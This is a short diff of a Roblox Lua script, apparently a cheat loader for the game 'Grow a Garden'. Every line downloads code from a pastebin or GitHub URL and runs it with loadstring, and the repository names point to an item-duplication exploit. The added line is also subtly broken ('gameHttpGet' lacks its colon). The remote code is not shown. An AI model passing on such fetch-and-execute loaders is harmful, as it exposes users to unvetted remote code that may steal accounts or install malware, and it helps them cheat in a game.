@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://pastebin.com/raw/bgBk7piN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Sk20dgaur/Grow-a-Garden-DUPE/refs/heads/main/ee461bec5d2b1b6a9e85b4b9a96bd940.txt"))()
+loadstring(gameHttpGet("https://raw.githubusercontent.com/Sk20dgaur/Grow-A-Garden.Duper/refs/heads/main/42cbb00890e7a6e2b8849969a72c8537.txt"))()
